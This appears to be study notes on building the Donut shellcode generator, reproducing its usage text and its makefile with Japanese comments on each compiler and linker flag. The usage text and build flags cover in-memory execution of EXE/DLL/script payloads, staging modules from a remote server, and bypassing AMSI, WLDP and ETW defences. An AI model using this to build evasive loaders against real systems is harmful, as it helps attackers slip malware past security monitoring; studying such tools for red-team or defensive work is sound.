## usage
```
  [ Donut shellcode generator v1 (built Dec  5 2024 10:46:14)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

 usage: donut [options] <EXE/DLL/VBS/JS>

       Only the finest artisanal donuts are made of shells.

                   -MODULE OPTIONS-

       -n,--modname: <name>                    Module name for HTTP staging. If entropy is enabled, this is generated randomly.
       -s,--server: <server>                   Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/
       -e,--entropy: <level>                   Entropy. 1=None, 2=Use random names, 3=Random names + symmetric encryption (default)

                   -PIC/SHELLCODE OPTIONS-

       -a,--arch: <arch>,--cpu: <arch>         Target architecture : 1=x86, 2=amd64, 3=x86+amd64(default).
       -o,--output: <path>                     Output file to save loader. Default is "loader.bin"
       -f,--format: <format>                   Output format. 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=Powershell, 7=C#, 8=Hex
       -y,--fork: <offset>                     Create a new thread for the loader and continue execution at <offset> relative to the host process's executable.
       -x,--exit: <action>                     Exit behaviour. 1=Exit thread (default), 2=Exit process, 3=Do not exit or cleanup and block indefinitely

                   -FILE OPTIONS-

       -c,--class: <namespace.class>           Optional class name. (required for .NET DLL)
       -d,--domain: <name>                     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.
       -i,--input: <path>,--file: <path>       Input file to execute in-memory.
       -m,--method: <method>,--function: <api> Optional method or function for DLL. (a method is required for .NET DLL)
       -p,--args: <arguments>                  Optional parameters/command line inside quotations for DLL method/function or EXE.
       -w,--unicode                            Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
       -r,--runtime: <version>                 CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
       -t,--thread                             Execute the entrypoint of an unmanaged EXE as a thread.

                   -EXTRA-

       -z,--compress: <engine>                 Pack/Compress file. 1=None, 2=aPLib, 3=LZNT1, 4=Xpress.
       -b,--bypass: <level>                    Bypass AMSI/WLDP/ETW : 1=None, 2=Abort on fail, 3=Continue on fail.(default)

       -k,--headers: <level>                   Preserve PE headers. 1=Overwrite (default), 2=Keep all

       -j,--decoy: <level>                     Optional path of decoy module for Module Overloading.

 examples:

    donut -ic2.dll
    donut --arch:x86 --class:TestClass --method:RunProcess --args:notepad.exe --input:loader.dll
    donut -iloader.dll -c TestClass -m RunProcess -p"calc notepad" -s http://remote_server.com/modules/
```

# Source Code
## Building
windowsの場合は  
`nmake -f makefile.msvc`（「nmake」コマンドでターゲットを指定しない場合、一番最初に書かれたターゲット（この場合は「donut」ターゲット）が実行される）
```makefile
# 「@echo」の前に、依存ターゲットとしてCleanターゲットを実行
donut: clean
	#「@echo」は、「###### Building exe2h ######」のみを出力する
	@echo ###### Building exe2h ######
	# exe2h.exe、exe2h.obj、mmap-windows.objが作成される（「/nologo」はコンパイル開始時の著作権情報の表示と情報メッセージの表示を抑制）
	cl /nologo loader\exe2h\exe2h.c loader\exe2h\mmap-windows.c
	
	@echo ###### Building loader ######
	# 「-D」は、プリプロセッサシンボルを定義（今回は「BYPASS_AMSI_B」と「BYPASS_WLDP_A」を定義）
	# 「-Zp8」は、構造体を 8 バイト境界にパックする (x86、ARM、および ARM64 の既定値)
	# 「-c」は、リンクを行わないでコンパイルする（.objファイルのみが作成される）
	# 「-Gy」は、コンパイラが個々の関数をパッケージ関数 (COMDAT) の形式でパッケージ化できるようにする（リンカーを使用するには、関数を COMDAT として個別にパッケージ化し、DLL または .exe ファイル内の個々の関数を除外または順序付けする必要がある）
	# 「-Os」は、実行可能ファイルで、サイズの小ささを優先させる
	# 「-O1」は、コードを最小化する。
	# 「-GR-」はランタイム型情報を無効にする。有効にすると、.rdataセクションのサイズが大きくなる
	# 「-EHa」は、C++ 例外処理を有効にする
	# 「-Oi」は、組み込み関数を生成する。実行速度は向上するが、作成されたコードが追加されるためサイズが大きくなる可能性があり
	# 「-GS-」は、バッファーのセキュリティチェックをオフにする
	# 「-I include」でincludeディレクトリを検索
	# loader.obj、hash.obj、encrypt.obj、depack.obj、clib.objが作成される（exeは「-c」オプションにより作成されない）
	cl -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -O1 -GR- -EHa -Oi -GS- -I include loader\loader.c hash.c encrypt.c loader\depack.c loader\clib.c
	# 「-order」は、個別にパッケージ化された (COMDAT) 関数のリンク順序を指定する
	# 「-entry:」は、開始アドレスとしてエントリ ポイント関数を指定
	# 「-fixed」は、指定されたベースアドレスにだけプログラムを読み込むように指示する
	# 「subsystem:console」は、実行可能ファイルの環境を「Win32モードアプリケーション」にしていする
	# 「-nodefaultlib」は、外部参照を解決するときに検索するライブラリの一覧からすべての既定のライブラリを削除する
	# loader.exeが出力される
	link -nologo -order:@loader\order.txt -entry:DonutLoader -fixed -subsystem:console -nodefaultlib loader.obj hash.obj encrypt.obj depack.obj clib.obj
	exe2h loader.exe
	
	@echo ###### Building generator ######
	rc include\donut.rc
	cl -Zp8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\clib.c lib\aplib64.lib include\donut.res
	cl -Zp8 -nologo -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\clib.c lib\aplib64.lib
	move donut.lib lib\donut.lib
	move donut.exp lib\donut.exp
	move donut.dll lib\donut.dll

	@echo ###### Building injection testing tools ######
	cl -Zp8 -nologo -DTEST -I include loader\inject.c
	cl -Zp8 -nologo -DTEST -I include loader\inject_local.c
debug: clean
	cl /nologo -DDEBUG -DBYPASS_AMSI_B -DBYPASS_WLDP_A -DBYPASS_ETW_B -Zp8 -c -nologo -Gy -Os -EHa -GS- -I include loader\loader.c hash.c encrypt.c loader\depack.c loader\clib.c
	link -nologo -order:@loader\order.txt -subsystem:console loader.obj hash.obj encrypt.obj depack.obj clib.obj
  
	cl -Zp8 -nologo -DDEBUG -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader\clib.c lib\aplib64.lib
	cl -Zp8 -nologo -DDEBUG -DDLL -LD -I include donut.c hash.c encrypt.c format.c loader\clib.c lib\aplib64.lib
	move donut.lib lib\donut.lib
	move donut.exp lib\donut.exp
	move donut.dll lib\donut.dll

	cl -Zp8 -nologo -DTEST -I include loader\inject.c
	cl -Zp8 -nologo -DTEST -I include loader\inject_local.c
hash:
	cl -Zp8 -nologo -DTEST -I include hash.c loader\clib.c
encrypt:
	cl -Zp8 -nologo -DTEST -I include encrypt.c
inject:
	cl -Zp8 -nologo -DTEST -I include loader\inject.c
inject_local:
	cl -Zp8 -nologo -DTEST -I include loader\inject_local.c
# cleanターゲットは疑似ターゲットであり、ファイル参照せずコマンドのみ実行する
# 「del」はMS-DOSのファイル削除コマンド
clean:
	@del /Q mmap-windows.obj donut.obj hash.obj encrypt.obj inject.obj inject_local.obj depack.obj format.obj clib.obj exe2h.exe loader.exe hash.exe encrypt.exe inject.exe inject_local.exe donut.exe lib\donut.lib lib\donut.exp lib\donut.dll include\donut.res
```


## 
